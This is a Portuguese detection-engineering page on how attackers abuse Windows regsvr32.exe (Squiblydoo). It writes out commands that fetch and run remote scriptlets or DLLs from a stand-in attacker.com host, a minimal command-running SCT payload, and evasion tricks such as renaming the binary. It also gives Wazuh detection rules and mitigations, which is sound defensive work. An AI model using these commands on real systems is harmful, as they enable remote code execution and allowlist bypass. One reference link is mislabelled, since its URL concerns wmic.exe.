# regsvr32.exe

**Plataforma:** Windows (todas as versões)

**Categorias:** AWL Bypass, Execução de código remoto, Proxy de execução

**MITRE ATT&CK:** T1218.010 (System Binary Proxy Execution — Regsvr32)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/

---

## O que é o regsvr32.exe

O regsvr32.exe (Register Server) é uma ferramenta de linha de comando do Windows para registrar e cancelar o registro de DLLs e controles ActiveX (arquivos OCX) no registro do Windows. É um componente essencial do sistema e está presente em todas as versões do Windows.

Sua função legítima é inserir no registro as entradas necessárias para que componentes COM sejam localizados pelo sistema. Ao registrar uma DLL com regsvr32, o sistema passa a saber que aquela DLL implementa determinada interface COM e onde ela está localizada.

---

## Por que atacantes usam o regsvr32.exe

O regsvr32 ficou famoso na comunidade de segurança em 2016 com a publicação da técnica "Squiblydoo" por Casey Smith. A descoberta foi que o regsvr32 pode carregar e executar scripts COM (arquivos SCT) diretamente de URLs remotas, sem escrita em disco e sem necessidade de nenhuma entrada de registro.

Essa característica cria um vetor de execução que:
- Não requer privilégios de administrador
- Não cria arquivos no disco do alvo
- Bypassa o AppLocker por completo (o regsvr32 é um binário assinado pela Microsoft na whitelist)
- Bypassa o proxy em alguns casos, pois usa a WinINET diretamente
- Deixa poucos artefatos forenses

---

## Técnicas de abuso

### Squiblydoo — execução de SCT remoto (técnica original)

O arquivo SCT (Scriptlet) é um arquivo XML que implementa um componente COM usando JScript ou VBScript. O regsvr32 pode carregar e executar esse arquivo diretamente de uma URL.

```cmd
:: Execução de SCT remoto via scrobj.dll
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll

:: As flags significam:
:: /s = silencioso (sem caixa de diálogo)
:: /n = não chamar DllRegisterServer
:: /u = modo de cancelamento de registro (chama DllUnregisterServer)
:: /i = argumento para DllInstall — aqui é a URL do SCT

:: Variação com HTTPS
regsvr32 /s /n /u /i:https://attacker.com/payload.sct scrobj.dll

:: Variação sem /u (também funciona)
regsvr32 /s /n /i:http://attacker.com/payload.sct scrobj.dll
```

O arquivo SCT mínimo para execução de comando:

```xml
<?XML version="1.0"?>
<scriptlet>
  <registration progid="PoC" classid="{AAAAAAAA-0000-0000-0000-000000000000}">
    <script language="JScript">
      var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c whoami > C:\\temp\\out.txt");
    </script>
  </registration>
</scriptlet>
```

### Execução de DLL local

```cmd
:: Registrar DLL maliciosa — chama DllRegisterServer, que pode conter código arbitrário
regsvr32 C:\Users\Public\payload.dll

:: Com /s para suprimir caixas de diálogo
regsvr32 /s C:\Users\Public\payload.dll

:: Cancelar registro (chama DllUnregisterServer — também pode conter código)
regsvr32 /u /s C:\Users\Public\payload.dll
```

### Execução via UNC path (sem arquivo local)

```cmd
:: DLL carregada diretamente de compartilhamento SMB
regsvr32 /s \\attacker.com\share\payload.dll

:: SCT via UNC
regsvr32 /s /n /u /i:\\attacker.com\share\payload.sct scrobj.dll
```

### Bypass de AppLocker

O AppLocker em modo padrão cria regras que permitem binários assinados da Microsoft. O regsvr32.exe é um desses binários, portanto o AppLocker o permite por padrão — incluindo qualquer código que ele execute via SCT ou DLL.

---

## Técnicas de bypass e evasão

### Renomeação do binário

```cmd
copy C:\Windows\System32\regsvr32.exe C:\Windows\Temp\update32.exe
C:\Windows\Temp\update32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

### Variações de capitalização e caminho

```cmd
REGSVR32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
C:\Windows\SysWOW64\regsvr32.exe /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
```

### Uso de redirecionadores para ocultar URL

```cmd
regsvr32 /s /n /u /i:https://bit.ly/xxxxxxx scrobj.dll
```

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- regsvr32 com argumento `/i:http` ou `/i:https` — carregamento remoto de SCT
- regsvr32 com argumento `/i:\\` — carregamento via UNC
- regsvr32 com `scrobj.dll` — biblioteca de scripts COM
- regsvr32 iniciando conexão de rede (Sysmon Event ID 3)

**Indicadores de média relevância:**

- regsvr32 carregando DLL fora de `System32` ou `Program Files`
- regsvr32 renomeado (verificar `OriginalFileName`)
- regsvr32 iniciado como filho de processo Office ou navegador

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0202-lolbas_awl_bypass.xml -->

<group name="lolbins,lolbas,windows,awl-bypass">

  <!-- regsvr32 com URL remota no argumento /i -->
  <rule id="100318" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)regsvr32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)/i\s*:\s*https?://</field>
    <description>regsvr32.exe com SCT remoto via HTTP — tecnica Squiblydoo para execucao sem disco</description>
    <mitre>
      <id>T1218.010</id>
    </mitre>
  </rule>

  <!-- regsvr32 com UNC path -->
  <rule id="100319" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)regsvr32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)/i\s*:\\\\</field>
    <description>regsvr32.exe carregando via UNC path — execucao remota sem artefato local</description>
    <mitre>
      <id>T1218.010</id>
    </mitre>
  </rule>

  <!-- regsvr32 com scrobj.dll -->
  <rule id="100320" level="13">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)regsvr32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)scrobj\.dll</field>
    <description>regsvr32.exe invocando scrobj.dll — padrao classico do Squiblydoo</description>
    <mitre>
      <id>T1218.010</id>
    </mitre>
  </rule>

  <!-- regsvr32 iniciando conexão de rede -->
  <rule id="100321" level="13">
    <if_group>sysmon_event3</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)regsvr32\.exe$</field>
    <description>regsvr32.exe iniciando conexao de rede — possivel download de SCT ou DLL remota</description>
    <mitre>
      <id>T1218.010</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Registro legítimo de DLLs:** o regsvr32 é legitimamente usado por instaladores de software para registrar componentes COM. O uso legítimo envolve DLLs em `Program Files` ou `Windows`, sem as flags `/n`, `/u` e sem URL no argumento `/i`. Qualquer uso com URL remota é praticamente sempre malicioso.

---

## Proteção e controles defensivos

**AppLocker com regras de publisher para DLLs:** configure o AppLocker para bloquear carregamento de DLLs não assinadas. Isso não bloqueia o Squiblydoo diretamente, mas reduz o impacto de DLLs maliciosas locais.

**Bloquear acesso HTTP/HTTPS do regsvr32 via firewall de aplicação:** regras de firewall que impedem o regsvr32 de fazer conexões de saída eliminam completamente o vetor de SCT remoto.

**Windows Defender ASR — regra "Block regsvr32.exe from registering COM servers":** esta regra ASR específica bloqueia o abuso do Squiblydoo sem impactar o uso legítimo do regsvr32 para registro local de DLLs.

---

## Referências

- LOLBAS — regsvr32.exe: https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
- MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/
- Artigo original Squiblydoo: https://subt0x11.blogspot.com/2018/04/wmicexe-whitelisting-bypass-heres.html
